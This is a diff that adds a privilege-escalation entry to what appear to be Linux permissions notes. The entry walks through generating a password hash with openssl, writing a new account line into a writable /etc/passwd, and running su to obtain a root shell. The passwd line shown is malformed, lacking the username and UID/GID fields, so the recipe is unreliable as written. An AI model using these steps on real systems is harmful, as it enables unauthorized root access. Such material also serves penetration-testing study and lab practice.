@@ -351,6 +351,22 @@ chmod 0750 <file/folder>
 
 Here in 0750, zero removes Sticky, SGID & SUID bits, seven for full permissions for owner, five for read and execute permissions for group, and no permissions for others.
 
+-------------------------------
+
+# if /etc/passwd is writable by any program with root priv, then find this program on gtfobins and try to add a user inside on passwd file
+
+1 # on attacker's pc let's generate a user/pass in our case  user:user  and password:admin
+openssl passwd -1 -salt user admin
+#we will have something like:
+$1$user$sfjfd.3434jLJljdiqj
+
+2 # create passwd file on attacker's pc and copy of passwd file content from the box and add generate string from step above
+$1$user$sfjfd.3434jLJljdiqj:root:/root:/bin/bash
+
+# copy back passwd file from attacker's pc on box. run
+su user
+#it will ask for password type admin and we get root shell
+
 
 
 
